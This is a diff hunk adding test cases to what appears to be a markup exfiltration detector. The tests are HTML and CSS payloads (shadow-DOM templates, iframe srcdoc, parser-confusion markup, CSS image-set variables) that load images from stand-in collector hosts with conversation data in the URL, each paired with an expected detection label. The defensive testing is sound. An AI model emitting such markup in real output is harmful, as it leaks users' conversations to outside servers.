@@ -636,6 +636,31 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["exfiltration_query"],
         ),
         ("<base href='https:///'><img src='https://a.test/a.png'>", []),
+        (
+            (
+                "<iframe srcdoc='&lt;div&gt;&lt;template shadowrootmode=&quot;open&quot;&gt;"
+                "&lt;img src=&quot;https://collector.test/{conversation}.png&quot;&gt;&lt;/template&gt;&lt;/div&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            "<template shadowrootmode='closed'><img src='https://collector.test/{c}.png'></template>",
+            ["exfiltration_query"],
+        ),
+        ("<template shadowrootmode='bogus'><img src='https://collector.test/{c}.png'></template>", []),
+        (
+            "<div><template><select><iframe></select></template><img src='https://collector.test/{conversation}.png'></div>",
+            ["uncheckable_markup"],
+        ),
+        (
+            "<div><template><select><xmp></select></template><img src='https://collector.test/{c}.png'></div>",
+            ["uncheckable_markup"],
+        ),
+        (
+            "<div style=\"--u:'https://collector.test/{c}.png';background-image:image-set(var(--u) 1x)\">x</div>",
+            ["exfiltration_query"],
+        ),
+        ("<style>:root{--brand:'Inter'} .a{font-family:var(--brand);content:'https://docs.test/{id}'}</style>", []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
